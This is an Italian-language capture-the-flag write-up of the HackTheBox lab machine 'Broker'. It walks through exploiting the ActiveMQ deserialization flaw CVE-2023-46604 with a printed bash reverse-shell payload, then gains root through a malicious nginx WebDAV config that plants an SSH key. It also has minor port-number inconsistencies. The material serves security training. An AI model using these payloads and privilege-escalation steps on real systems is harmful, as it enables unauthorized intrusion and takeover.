**TARGET 10.10.11.243**

# INFORMATION GATHERING

Per prima cosa lanciamo un rapido scan con [Nmap](Note/Tool/Nmap.md)

```bash
┌──(root㉿kali)-[/home/kali/htb/broker]
└─# nmap -sV -sC --min-rate=5000 10.10.11.243
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-15 07:02 EST
Nmap scan report for 10.10.11.243
Host is up (0.053s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.52 seconds
```

Abbiamo due porte aperte 

- 22 ssh OpenSSH 8.9p1 
- 80  http    nginx 1.18.0 (Ubuntu)

Uno scan piu approfondito su tutte le porte ne rileva altre aperte
```shell-session
┌──(root㉿kali)-[/home/kali/htb/broker]
└─# nmap -sV -sC -p- --min-rate=5000 10.10.11.243
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-15 07:03 EST
Nmap scan report for 10.10.11.243
Host is up (0.070s latency).
Not shown: 65525 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
1883/tcp  open  mqtt
|_mqtt-subscribe: Failed to receive control packet from server.
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
|_http-server-header: Jetty(9.4.39.v20210325)
43503/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings:
|   HELP4STOMP:
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
|_http-title: Site doesn't have a title.
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Jetty(9.4.39.v20210325)
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings:
|   NULL:
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion
|_    5.15.15
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5672-TCP:V=7.94%I=7%D=11/15%Time=6554B3C3%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10
SF:\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x0
SF:1\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20cl
SF:ient\x20using\x20unsupported\x20AMQP\x20attempted")%r(HTTPOptions,89,"A
SF:MQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa
SF:1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x
SF:02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20using\x
SF:20unsupported\x20AMQP\x20attempted")%r(RTSPRequest,89,"AMQP\x03\x01\0\0
SF:AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0
SF:`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:
SF:decode-error\xa17Connection\x20from\x20client\x20using\x20unsupported\x
SF:20AMQP\x20attempted")%r(RPCCheck,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0
SF:\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x
SF:02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17C
SF:onnection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempte
SF:d")%r(DNSVersionBindReqTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19
SF:\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0
SF:\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connect
SF:ion\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(
SF:DNSStatusRequestTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\
SF:0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x
SF:18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20
SF:from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(SSLSess
SF:ionReq,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc
SF:0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0
SF:S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20clien
SF:t\x20using\x20unsupported\x20AMQP\x20attempted")%r(TerminalServerCookie
SF:,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\
SF:x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\
SF:xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20u
SF:sing\x20unsupported\x20AMQP\x20attempted");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61613-TCP:V=7.94%I=7%D=11/15%Time=6554B3BE%P=x86_64-pc-linux-gnu%r(
SF:HELP4STOMP,27F,"ERROR\ncontent-type:text/plain\nmessage:Unknown\x20STOM
SF:P\x20action:\x20HELP\n\norg\.apache\.activemq\.transport\.stomp\.Protoc
SF:olException:\x20Unknown\x20STOMP\x20action:\x20HELP\n\tat\x20org\.apach
SF:e\.activemq\.transport\.stomp\.ProtocolConverter\.onStompCommand\(Proto
SF:colConverter\.java:258\)\n\tat\x20org\.apache\.activemq\.transport\.sto
SF:mp\.StompTransportFilter\.onCommand\(StompTransportFilter\.java:85\)\n\
SF:tat\x20org\.apache\.activemq\.transport\.TransportSupport\.doConsume\(T
SF:ransportSupport\.java:83\)\n\tat\x20org\.apache\.activemq\.transport\.t
SF:cp\.TcpTransport\.doRun\(TcpTransport\.java:233\)\n\tat\x20org\.apache\
SF:.activemq\.transport\.tcp\.TcpTransport\.run\(TcpTransport\.java:215\)\
SF:n\tat\x20java\.lang\.Thread\.run\(Thread\.java:750\)\n\0\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61616-TCP:V=7.94%I=7%D=11/15%Time=6554B3BE%P=x86_64-pc-linux-gnu%r(
SF:NULL,140,"\0\0\x01<\x01ActiveMQ\0\0\0\x0c\x01\0\0\x01\*\0\0\0\x0c\0\x11
SF:TcpNoDelayEnabled\x01\x01\0\x12SizePrefixDisabled\x01\0\0\tCacheSize\x0
SF:5\0\0\x04\0\0\x0cProviderName\t\0\x08ActiveMQ\0\x11StackTraceEnabled\x0
SF:1\x01\0\x0fPlatformDetails\t\0\x04Java\0\x0cCacheEnabled\x01\x01\0\x14T
SF:ightEncodingEnabled\x01\x01\0\x0cMaxFrameSize\x06\0\0\0\0\x06@\0\0\0\x1
SF:5MaxInactivityDuration\x06\0\0\0\0\0\0u0\0\x20MaxInactivityDurationInit
SF:alDelay\x06\0\0\0\0\0\0'\x10\0\x0fProviderVersion\t\0\x075\.15\.15");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.95 seconds

```

Quindi facciamo un breve riepilogo 

- 22 ssh OpenSSH 8.9p1 
- 80  http    nginx 1.18.0 (Ubuntu)
- 1337 http       nginx 1.18.0 
- 1883 mqtt
- 5672   open  amqp?
- 8161 http       Jetty 9.4.39.v20210325
- 43503 tcpwrapped
- 61613  stomp      Apache ActiveMQ
- 61614      Jetty 9.4.39.v20210325
- 61616 apachemq   ActiveMQ OpenWire transport

Sono parecchie, procediamo con calma 

# ENUMERATION


Data la versione recente di ssh sulla porta 22 avrò bisogno di credenziali valide per accedervi quindi iniziamo dalla numero porta 80

## Port 80

Visitamo`10.10.11.243` 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/broker.png)
Ci chiede username e password proviamo con alcuni combinazioni standard 
`admin:admin` funziona!
Veniamo indirizzati endpoint http://10.10.11.243/index.html

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/broker3.png)

**ActiveMQ** è un [message-oriented middleware](https://it.wikipedia.org/wiki/Message-oriented_middleware "Message-oriented middleware") (detto anche [broker di messaggistica](https://it.wikipedia.org/w/index.php?title=Broker_di_messaggistica&action=edit&redlink=1 "Broker di messaggistica (la pagina non esiste)")) scritto in [Java](https://it.wikipedia.org/wiki/Java_(linguaggio_di_programmazione) "Java (linguaggio di programmazione)") che dispone di un completo client [Java Message Service](https://it.wikipedia.org/wiki/Java_Message_Service "Java Message Service") (JMS). Implementa diversi protocolli di message queue:

- [OpenWire](https://it.wikipedia.org/w/index.php?title=OpenWire&action=edit&redlink=1 "OpenWire (la pagina non esiste)") : nativo
- [AMQP](https://it.wikipedia.org/wiki/Advanced_Message_Queuing_Protocol "Advanced Message Queuing Protocol")
- [MQTT](https://it.wikipedia.org/wiki/MQTT "MQTT")
- [STOMP](https://it.wikipedia.org/w/index.php?title=STOMP&action=edit&redlink=1 "STOMP (la pagina non esiste)")

abbiamo due link
Il pirmo link ci rimanda ad `/admin`

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/broker1.png)
Mentre il secondo link ci rimanda a `/demo` dove possiamo vedere la verisone di Jetty 9.4.39 v20210325 trovata anche da nmap.

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/broker2.png)ho provato a cercare con searchsploit se abbiamo qualche vulnerabiltà nota per `jetty 9.4.39` e `ActiveMQ`  ma non ho trovato niente...passiamo alla ricerca su google.

# GAINING AN INITIAL FOOTHOLD 

Su google troviamo più riferimenti alla  CVE-2023-46604.
Questa vulnerabilità critica nel broker di messaggi ActiveMQ, permette agli aggressori non autenticati di eseguire comandi shell arbitrari sui server compromessi. La vulnerabilità consente l'esecuzione di codice in modalità remota a causa di pratiche di deserializzazione non sicure all'interno del protocollo OpenWire.

> [!NOTA] [questo](https://www.matricedigitale.it/multilingua/ransomware-tellyouthepass-su-server-apache-activemq/) e [questo](https://www.helpnetsecurity.com/2023/11/02/cve-2023-46604-ransomware/)articolo mostrano che questa RCE è stata sfrutta attivamente per attacchi ransomware

Troviamo anche [Questa PoC](https://github.com/evkl1d/CVE-2023-46604) che sembra fare al caso nostro.
ce lo scarichiamo e  procediamo.

Per utilizzare lo script di exploit, è necessario fornire l'indirizzo IP del server ActiveMQ di destinazione, il numero di porta (il valore predefinito è 61616) e l'URL del file poc.xml.

```bash
┌──(root㉿kali)-[/home/kali/htb/broker]
└─# git clone https://github.com/evkl1d/CVE-2023-46604.git
Cloning into 'CVE-2023-46604'...
remote: Enumerating objects: 22, done.
remote: Counting objects: 100% (22/22), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 22 (delta 5), reused 13 (delta 3), pack-reused 0
Receiving objects: 100% (22/22), 5.10 KiB | 290.00 KiB/s, done.
Resolving deltas: 100% (5/5), done.

┌──(root㉿kali)-[/home/kali/htb/broker]
└─# ls
CVE-2023-46604

┌──(root㉿kali)-[/home/kali/htb/broker]
└─# cd CVE-2023-46604

┌──(root㉿kali)-[/home/kali/htb/broker/CVE-2023-46604]
└─# ls
exploit.py  poc.xml  README.md

┌──(root㉿kali)-[/home/kali/htb/broker/CVE-2023-46604]
└─# cat poc.xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/10.10.10.10/9001 0&gt;&amp;1</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```


vediamo che all'interno del file poc.xml abbiamo quella che è  una revshell in bash. modifichiamo l'indirizzo IP delle revshell con il nostro indirizzo IP.

Tiriamo un su un sever python dove abbiamo il nostro file `.xml`  
```bash
┌──(root㉿kali)-[/home/kali/htb/broker/CVE-2023-46604]
└─# python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

ci mettiamo in ascolto con nc 
```bash
┌──(root㉿kali)-[/home/kali/htb/broker]
└─# nc -lvnp 9001
listening on [any] 9001 ...
```

eseguiamo l'exploit 
```bash
┌──(root㉿kali)-[/home/kali/htb/broker/CVE-2023-46604]
└─# python3 exploit.py -i 10.10.11.243 -u http://10.10.14.48:8000/poc.xml
     _        _   _           __  __  ___        ____   ____ _____
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: 10.10.11.243:61616
[*] XML URL: http://10.10.14.48:8000/poc.xml

[*] Sending packet: 000000721f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e7465787401001f687474703a2f2f31302e31302e31342e34383a383030302f706f632e786d6c
```

abbiamo la nostra GET del file `poc.xml`

```bahs
┌──(root㉿kali)-[/home/kali/htb/broker/CVE-2023-46604]
└─# python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.243 - - [17/Nov/2023 12:07:00] "GET /poc.xml HTTP/1.1" 200 -
10.10.11.243 - - [17/Nov/2023 12:07:00] "GET /poc.xml HTTP/1.1" 200 -

```

e la nostra shell
```bash
┌──(root㉿kali)-[/home/kali/htb/broker]
└─# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.48] from (UNKNOWN) [10.10.11.243] 51672
bash: cannot set terminal process group (903): Inappropriate ioctl for device
bash: no job control in this shell
activemq@broker:/opt/apache-activemq-5.15.15/bin$ id
id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
activemq@broker:/opt/apache-activemq-5.15.15/bin$
```

e dopo aver effettuato l'upgrade della shell ci prediamo la nostra user_flag.

```bash
activemq@broker:~$ cat user.txt
44a2cc459f6064de0dbccc00bc0d92f4
```

# PRIVESC

Una della prime cose da fare e vedere se possiamo eseguire qualcosa come root e per farlo usiamo il comando `sudo -l`

```bash
activemq@broker:~$ sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Utilizzeremo ngx_http_dav_module per scrivere la nostra chiave SSH pubblica nel file authentic_keys dell'utente root. Per fare ciò, iniziamo creando il file di configurazione NGINX dannoso, che appare come segue:

```bash
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {

        worker_connections 768;

}  
http {

    server {
        listen 1337;

        root /;
        autoindex on;

        dav_methods PUT;
    }

}
```

Le parti fondamentali sono le seguenti:
- user root: i processi di lavoro verranno eseguiti da root, ovvero quando eventualmente caricheremo un file, anch'esso sarà di proprietà di root .
- root /: la radice del documento sarà la directory più in alto del filesystem.
- dav_methods PUT: abilitiamo l'estensione HTTP WebDAV con il metodo PUT, che consente ai client di caricare file.

Salviamo le impostazioni in un file e configuriamo NGINX per utilizzarlo tramite il flag -c.

```bash
activemq@broker:/tmp$ sudo nginx -c /tmp/pwd.conf
```

a questo punto non ci resta che creare la nostra coppia di chiavi RSA e caricare la chiave `.pub` sulla macchia compromessa e per farlo utilizziamo ssh-keygen

```bash
┌──(root㉿kali)-[/home/kali/htb/broker/CVE-2023-46604]
└─# ssh-keygen -f broker
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in broker
Your public key has been saved in broker.pub
The key fingerprint is:
SHA256:ZGBLmMBhz4DJLcXpy9HaR0aaK2XTdbL1luOz22bLutk root@kali
The key's randomart image is:
+---[RSA 3072]----+
|.+O+.o+          |
|o+.Boo + o o     |
|  o + * + = . .  |
|   o B * .   =   |
|  . B = S   o .  |
|   = o .     o   |
|    . .       o  |
|             .=o |
|             =*E.|
+----[SHA256]-----+


```

con curl carichiamo la chiave `borker.pub` sul target 

```
┌──(root㉿kali)-[/home/kali/htb/broker/CVE-2023-46604]
└─# curl 10.10.11.243:1338/root/.ssh/authorized_keys --upload-file broker.pub
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   563    0     0  100   563      0   3436 --:--:-- --:--:-- --:--:--  3453

```

non ci resta che collegarci tramite ssh 

```bash
┌──(root㉿kali)-[/home/kali/htb/broker/CVE-2023-46604]
└─# ssh -i broker root@10.10.11.243
The authenticity of host '10.10.11.243 (10.10.11.243)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:16: [hashed name]
    ~/.ssh/known_hosts:19: [hashed name]
    ~/.ssh/known_hosts:64: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.243' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Nov 17 06:05:58 PM UTC 2023

  System load:           0.080078125
  Usage of /:            74.3% of 4.63GB
  Memory usage:          20%
  Swap usage:            0%
  Processes:             171
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.243
  IPv6 address for eth0: dead:beef::250:56ff:feb9:8dc8


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Nov 16 13:29:24 2023 from 127.0.0.1
root@broker:~# id
uid=0(root) gid=0(root) groups=0(root)
root@broker:~# cat /root/root.txt
f0d75f5a65b42a4dbe3a5b14ad373bc6
```

